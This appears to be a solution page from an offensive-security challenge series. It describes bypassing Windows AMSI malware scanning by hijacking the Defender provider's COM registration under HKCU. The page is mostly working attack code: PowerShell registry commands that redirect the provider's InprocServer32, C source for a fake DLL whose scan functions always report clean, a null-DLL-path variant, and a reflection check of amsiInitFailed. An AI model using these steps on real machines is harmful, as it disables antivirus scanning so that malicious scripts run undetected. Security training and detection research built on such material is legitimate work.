---
title: "Solution 35: COM Server Hijacking (AMSI Provider Override)"
challenge_number: 35
difficulty: hard
category: "AMSI Bypass"
permalink: /solutions/35-com-server-hijacking/
---

# Solution: COM Server Hijacking (AMSI Provider Override)

[Back to Challenge](../challenges/35-com-server-hijacking.md)

## Overview

Create an HKCU COM registration that overrides the system's AMSI provider CLSID. Point the `InprocServer32` entry to a dummy DLL that implements `AmsiScanBuffer()` returning `AMSI_RESULT_CLEAN`. Since HKCU COM registrations take priority over HKLM, no administrator privileges are required.

## Working Code

### Step 1: Identify the AMSI Provider CLSID

The Windows Defender AMSI provider CLSID is:
```
{2781761E-28E0-4109-99FE-B9D127C57AFE}
```

The AMSI COM interface CLSID itself is:
```
{fdb00e52-a214-4aa1-8fba-4357bb0072ec}
```

### Step 2: Create the Registry Hijack

```powershell
# AMSI provider CLSID (Windows Defender's AMSI DLL)
$clsid = "{2781761E-28E0-4109-99FE-B9D127C57AFE}"

# Create HKCU COM override pointing to our dummy DLL
$regPath = "HKCU:\SOFTWARE\Classes\CLSID\$clsid\InprocServer32"
New-Item -Path $regPath -Force | Out-Null

# Point to our fake AMSI provider DLL
Set-ItemProperty -Path $regPath -Name "(Default)" -Value "C:\Temp\fakeamsi.dll"
Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Both"

Write-Host "COM hijack registered. New PowerShell sessions will load fakeamsi.dll"
```

### Step 3: Create the Dummy DLL (C Source)

```c
// fakeamsi.c - Compile with: cl /LD fakeamsi.c /link /DEF:fakeamsi.def
#include <windows.h>

// Minimal AMSI result enum
#define AMSI_RESULT_CLEAN 0

// Stub AmsiScanBuffer - always returns clean
__declspec(dllexport) HRESULT AmsiScanBuffer(
    void* amsiContext,
    void* buffer,
    ULONG length,
    const wchar_t* contentName,
    void* amsiSession,
    int* result)
{
    *result = AMSI_RESULT_CLEAN;
    return S_OK;
}

// Stub AmsiScanString - always returns clean
__declspec(dllexport) HRESULT AmsiScanString(
    void* amsiContext,
    const wchar_t* string,
    const wchar_t* contentName,
    void* amsiSession,
    int* result)
{
    *result = AMSI_RESULT_CLEAN;
    return S_OK;
}

// Required COM entry points
__declspec(dllexport) HRESULT DllGetClassObject(void* rclsid, void* riid, void** ppv)
{
    return E_NOTIMPL;
}

__declspec(dllexport) HRESULT DllCanUnloadNow(void)
{
    return S_FALSE;
}

BOOL WINAPI DllMain(HINSTANCE hDLL, DWORD dwReason, LPVOID lpReserved)
{
    return TRUE;
}
```

### Step 4: Module Definition File (for proper exports)

```
; fakeamsi.def
LIBRARY fakeamsi
EXPORTS
    AmsiScanBuffer
    AmsiScanString
    DllGetClassObject
    DllCanUnloadNow
```

### Compile the DLL

```cmd
:: Using Visual Studio Developer Command Prompt
cl /LD fakeamsi.c /link /DEF:fakeamsi.def /OUT:fakeamsi.dll

:: Or using MinGW
gcc -shared -o fakeamsi.dll fakeamsi.c -Wl,--out-implib,libfakeamsi.a
```

### Alternative: PowerShell-Only Registry Approach (Null DLL Path)

```powershell
# Instead of a real DLL, point to a non-existent path
# This causes AMSI initialization to fail, equivalent to amsiInitFailed
$clsid = "{2781761E-28E0-4109-99FE-B9D127C57AFE}"
$regPath = "HKCU:\SOFTWARE\Classes\CLSID\$clsid\InprocServer32"
New-Item -Path $regPath -Force | Out-Null
Set-ItemProperty -Path $regPath -Name "(Default)" -Value "C:\nonexistent\fake.dll"
Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Both"

# New PowerShell sessions will fail to load AMSI provider
# This triggers the amsiInitFailed code path
```

### Cleanup

```powershell
# Remove the hijack
$clsid = "{2781761E-28E0-4109-99FE-B9D127C57AFE}"
Remove-Item -Path "HKCU:\SOFTWARE\Classes\CLSID\$clsid" -Recurse -Force
Write-Host "COM hijack removed."
```

## Why It Works

### COM Resolution Order

When a process calls `CoCreateInstance` with a CLSID, Windows searches for the registration in this order:

1. **HKCU\SOFTWARE\Classes\CLSID\{guid}** ← Checked first (user-level)
2. **HKLM\SOFTWARE\Classes\CLSID\{guid}** ← System-level (requires admin to modify)

If an entry exists in HKCU, it **overrides** the HKLM entry entirely. This is by design — it allows per-user COM component customization.

### AMSI Initialization Flow

```
PowerShell starts
    → Calls CoCreateInstance({AMSI-Provider-CLSID})
    → COM runtime searches HKCU first
    → Finds our hijacked InprocServer32
    → Loads our fakeamsi.dll instead of real provider
    → Our DLL's AmsiScanBuffer always returns CLEAN
    → All scans pass
```

### No Admin Required

The critical insight is that HKCU is writable by the current user without elevation. The COM hijack only affects processes launched by that user — but that's exactly the scope needed for an AMSI bypass.

### Why a Non-Existent DLL Also Works

If the DLL path is invalid, `CoCreateInstance` fails. PowerShell handles this failure by setting `amsiInitFailed = true` internally (it can't crash just because an AV provider isn't available). This achieves the same result as Challenge 31.

## How to Verify

1. Set up the COM hijack (use the "Null DLL Path" approach for simplicity):
   ```powershell
   $clsid = "{2781761E-28E0-4109-99FE-B9D127C57AFE}"
   $regPath = "HKCU:\SOFTWARE\Classes\CLSID\$clsid\InprocServer32"
   New-Item -Path $regPath -Force | Out-Null
   Set-ItemProperty -Path $regPath -Name "(Default)" -Value "C:\fake\notreal.dll"
   Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Both"
   ```

2. Verify the registry key was created:
   ```powershell
   Get-ItemProperty -Path $regPath
   ```

3. Launch a NEW PowerShell session (the hijack takes effect on process startup):
   ```powershell
   Start-Process powershell.exe -ArgumentList '-NoProfile -Command "Write-Host AMSI bypassed: malware test string"'
   ```

4. Confirm in the new session that AMSI is non-functional:
   ```powershell
   # In the new session, check amsiInitFailed
   $ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
   $field = $ref.GetField('amsiInitFailed','NonPublic,Static')
   Write-Host "amsiInitFailed: $($field.GetValue($null))"
   # Should be True if using non-existent DLL path
   ```

5. Clean up after testing:
   ```powershell
   Remove-Item -Path "HKCU:\SOFTWARE\Classes\CLSID\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse -Force
   ```
